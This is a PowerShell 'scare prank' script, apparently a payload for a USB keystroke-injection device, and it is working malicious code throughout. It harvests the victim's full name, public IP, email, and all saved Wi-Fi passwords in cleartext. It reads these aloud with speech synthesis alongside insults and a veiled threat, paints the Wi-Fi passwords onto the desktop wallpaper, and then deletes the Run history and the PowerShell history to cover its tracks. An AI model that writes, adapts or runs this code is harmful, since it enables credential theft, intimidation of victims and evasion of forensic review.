
function Get-fullName {

    try {

        $fullName = Net User $Env:username | Select-String -Pattern "Full Name"; $fullName = ("$fullName").TrimStart("Full Name")
        Write-Host $fullName -ForegroundColor Green
    }
 
    # If no name is detected function will return $env:UserName 

    # Write Error is just for troubleshooting 
    catch {
        Write-Error "No name was detected"
        return $env:UserName
        -ErrorAction SilentlyContinue
    }

    return $fullName 

}

function Get-Ram {
    $ram = Get-WmiObject Win32_ComputerSystem | Select-Object TotalPhysicalMemory
    $ram = $ram.TotalPhysicalMemory / 1GB
    $ram = [math]::Round($ram)
    Write-Host $ram Done -ForegroundColor Green
    return $ram
}

function Get-PublicIP {
    try {
        $computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
        Write-Host $computerPubIP -ForegroundColor Green
    }
    catch {
        Write-error "No public IP found"
        return $null
        -ErrorAction SilentlyContinue
    }

    return $computerPubIP
}

function Get-Pass {
    try {
        $pro = netsh wlan show interface | Select-String -Pattern " SSID "
        $pro = $pro -replace "SSID", ""; $pro = $pro -replace ":", ""; $pro = $pro -replace " ", "";
        
        $pass = netsh wlan show profile $pro key=clear | Select-String -Pattern 'Key Content'; $pass = [string]$pass
        $passPOS = $pass.IndexOf(':')
        $pass = $pass.Substring($passPOS + 2).Trim()
        Write-Host $pass -ForegroundColor Green
    }
    catch {
        Weite-Error "No network found"
        return $null
        -ErrorAction SilentlyContinue
    }
    return $pass
}

function Get-Networks {
    # Get Wifi SSIDs and Passwords	
    $WLANProfileNames = @()

    #Get all the WLAN profile names
    $Output = netsh.exe wlan show profiles | Select-String -pattern " : "

    #Trim the output to receive only the name
    Foreach ($WLANProfileName in $Output) {
        $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
    }
    $WLANProfileObjects = @()

    ForEach ($WLANProfileName in $WLANProfileNames) {
        try {
            $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string "Key Content" ) -split ":")[1]).Trim()
        }
        catch {
            $WLANProfilePassword = "The password is not stored in this profile :("
        }

        $WLANProfileObject = New-Object PSCustomObject
        $WLANProfileObject | Add-Member -Type NoteProperty -Name "SSID" -Value $WLANProfileName
        $WLANProfileObject | Add-Member -Type NoteProperty -Name "Password" -Value $WLANProfilePassword
        $WLANProfileObjects += $WLANProfileObject
    }
    return $WLANProfileObjects

    Write-Host "Networks found: $WLANProfileNames.Count" -ForegroundColor Green

    # return $WLANProfileNames
}

function Gen-Image {
    param (
        # Networks
        [parameter(Mandatory = $True)]
        [Object]$Networks
    )

    Add-Type -AssemblyName System.Drawing

    $filename = "C:\Users\Public\Documents\test.png" 
    $font = new-object System.Drawing.Font Consolas, 24 
    $brushBg = [System.Drawing.Brushes]::Black 
    $brushFg = [System.Drawing.Brushes]::White 

    # Create the Bitmap object
    $bmp = new-object System.Drawing.Bitmap 1920, 1080
    $graphics = [System.Drawing.Graphics]::FromImage($bmp) 
    $graphics.FillRectangle($brushBg, 0, 0, $bmp.Width, $bmp.Height)
    $graphics.DrawString("Computer name and ip: $(Get-PublicIP)", $font, $brushFg, 10, 10) 
    $y = 40
    foreach ($net in $Networks) {
        # $size = $graphics.MeasureString($net.Password, $font)
        $graphics.DrawString("$($net.SSID):", $font, $brushFg, 20, $y)
        $graphics.DrawString(" " * 40 + $net.Password, $font, $brushFg, 150, $y)
        $y += 30
    }
    $graphics.Dispose() 
    $bmp.Save($filename) 

    # Invoke-Item $filename


    # Copy the image to the desktop
    $newPath = "C:\Users\$env:USERNAME\Desktop\NotSUS.png"
    Copy-Item "C:\Users\Public\Documents\test.png" $newPath

    Write-Host "Image generated" -ForegroundColor Green
    return $newPath
}

function Set-WallPaper {
    param (
        [parameter(Mandatory = $True)]
        # Provide path to image
        [string]$Image,
        # Provide wallpaper style that you would like applied
        [parameter(Mandatory = $False)]
        [ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
        [string]$Style
    )
 
    $WallpaperStyle = Switch ($Style) {
  
        "Fill" { "10" }
        "Fit" { "6" }
        "Stretch" { "2" }
        "Tile" { "0" }
        "Center" { "0" }
        "Span" { "22" }
  
    }
 
    If ($Style -eq "Tile") {
 
        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force
 
    }
    Else {
 
        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force
 
    }
 
    Add-Type -TypeDefinition @" 
using System; 
using System.Runtime.InteropServices;
  
public class Params
{ 
    [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
    public static extern int SystemParametersInfo (Int32 uAction, 
                                                   Int32 uParam, 
                                                   String lpvParam, 
                                                   Int32 fuWinIni);
}
"@ 
  
    $SPI_SETDESKWALLPAPER = 0x0014
    $UpdateIniFile = 0x01
    $SendChangeEvent = 0x02
  
    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
  
    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
}

function Get-email {
    try {
        $email = GPRESULT -Z /USER $Env:USERNAME | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches; $email = ("$email").Trim()
        # $emailpos = $email.IndexOf("@")
        # $domain = $email.Substring($emailpos + 1)
        Write-Host "Email found: $email" -ForegroundColor Green
    }
    catch {
        $email = "No email found"
        Write-Error "No email found"
    }
    return $email

}

function Get-Days_Set {
    try {
        $pls = net user $env:UserName | Select-String -Pattern "Password last" ; $pls = [string]$pls
        $plsPOS = $pls.IndexOf("e")
        $pls = $pls.Substring($plsPOS + 2).Trim()
        $pls = $pls -replace ".{3}$"
        $time = ((get-date) - (get-date "$pls")) ; $time = [string]$time 
        $DateArray = $time.Split(".")
        $days = [int]$DateArray[0]
        Write-Host "Days since password set: $days" -ForegroundColor Green
    }
 
    # If no password set date is detected funtion will return $null to cancel Sapi Speak

    # Write Error is just for troubleshooting 
    catch {
        Write-Error "Day password set not found" 
        return $null
        -ErrorAction SilentlyContinue
    }
    return $days
}

$s = New-Object -ComObject SAPI.SpVoice

$s.Rate = -1
$days = Get-Days_Set
$full_name = Get-fullName
$ram = Get-Ram
$ip = Get-PublicIP
$pass = Get-Pass
$email = Get-email
$Networks = Get-Networks
$passLength = $pass.Length


# caps lock indicator light
$blinks = 3; $o = New-Object -ComObject WScript.Shell; for ($num = 1 ; $num -le $blinks * 2; $num++) { $o.SendKeys("{CAPSLOCK}"); Start-Sleep -Milliseconds 250 }



#-----------------------------------------------------------------------------------------------------------

<#

.NOTES 
	Then the script will be paused until the mouse is moved 
	script will check mouse position every indicated number of seconds
	This while loop will constantly check if the mouse has been moved 
	"CAPSLOCK" will be continously pressed to prevent screen from turning off
	it will then sleep for the indicated number of seconds and check again
	when mouse is moved it will break out of the loop and continue theipt
#>


Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X

while (1) {
    $pauseTime = 3
    if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS) {
        break
    }
    else {
        $o.SendKeys("{CAPSLOCK}"); Start-Sleep -Seconds $pauseTime
    }
}
Write-Host "it worked"


$wshell = New-Object -ComObject Wscript.Shell
$wshell.Popup("Hello $full_name...", 0, "Error", 32 + 4)


$s.Speak("Hello $full_name.")
$s.Speak("Have you lurned to not piss off hackers yet?")

if ($ram -gt 63) {
    $s.Speak("You have $ram gigabytes of ram. Really? You dont need that much for watching *THINGS* on the internet $full_name. But a computer this good with no security...")
}
elseif ($ram -gt 31) {
    $s.Speak("You have $ram gigabytes of ram. Decent pc. You dont need that much for watching *THINGS* on the internet $full_name. But a computer this good with no security...")
}
elseif ($ram -gt 15) {
    $s.Speak("You have $ram gigabytes of ram. Nice amout to run. If you just play games, perfect. Good for watching *THINGS* on the internet.. But no security...")
}
else {
    $s.Speak("You have $ram gigabytes of ram. Poor you :(. You wont need this pc then.")
}


# if pass is bigger or less then 
if ($pass -gt 6) {
    $message = "A password thats $passLength characters long. Well done. Your not as dumb as you seem, still pretty dumb."
}
else {
    $message = "A password thats $passLength characters long is not secure at all mate. Pretty dumb."
}

if ($days -gt 30) {
    $message = $message + " You have not changed your password in $days days. You should change it. Or i will invite my friends over to your house and we will change it for you...."
}
else {
    $message = $message + " You have changed your password in $days days. Good job. Guess if you keep this up il have to find a new victim."
}

$s.Speak($message)

$s.Speak("You think i am just making this info up, well think again... I am sure you thought $pass as a password was sucure...")

$s.Speak("You starting to believe me now?")

$s.Speak("So if you know anything about public IP's, then you know they are pretty usefull for us. If not, now you do :)... $ip. Nice!")


$s.Speak("Want to see something cool?")


$Image = Gen-Image -Networks $Networks
Set-WallPaper -Image $Image -Style "Fit"


$s.Speak("Have a look at your desktop, il be waiting here...")


reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

Remove-Item "C:\Users\Public\Documents\test.png"

Add-Type -AssemblyName System.Windows.Forms
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')

#If true, toggle CapsLock key, to ensure that the script doesn't fail
if ($caps -eq $true) {

    $key = New-Object -ComObject WScript.Shell
    $key.SendKeys('{CapsLock}')
}


<#
.NOTES
    Get-Ram
    Get-PublicIP
    Get-Pass
    Get-Networks
    Gen-Image
    Set-WallPaper
    Get-email
    Get-Days_Set
#>
